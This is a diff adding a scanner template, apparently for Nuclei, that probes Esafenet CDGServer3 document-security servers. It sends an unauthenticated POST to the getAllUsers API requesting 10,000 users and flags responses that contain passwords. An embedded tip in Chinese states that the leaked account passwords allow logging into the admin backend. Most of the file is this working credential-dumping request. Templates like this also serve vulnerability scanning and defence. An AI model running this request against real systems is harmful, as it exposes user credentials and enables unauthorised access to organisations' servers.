@@ -1,0 +1,31 @@
+id: esafenet-cdgserver3-getAllUsers-disclosure
+info:
+  name: 亿赛通-电子文档安全管理系统-getAllUsers-信息泄露
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-%E4%BA%BF%E8%B5%9B%E9%80%9A-getAllUsers-leak.yaml
+  classification:
+    cve-id: 
+  metadata:
+    verified: false
+    fofa-query: demo
+    tips: 泄露账号密码，可登录后台
+  tags: esafenet,disclosure
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/openapi/getAllUsers HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        pageSize=10000&pageNumber=1
+ 
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'password','code')
+        condition: and
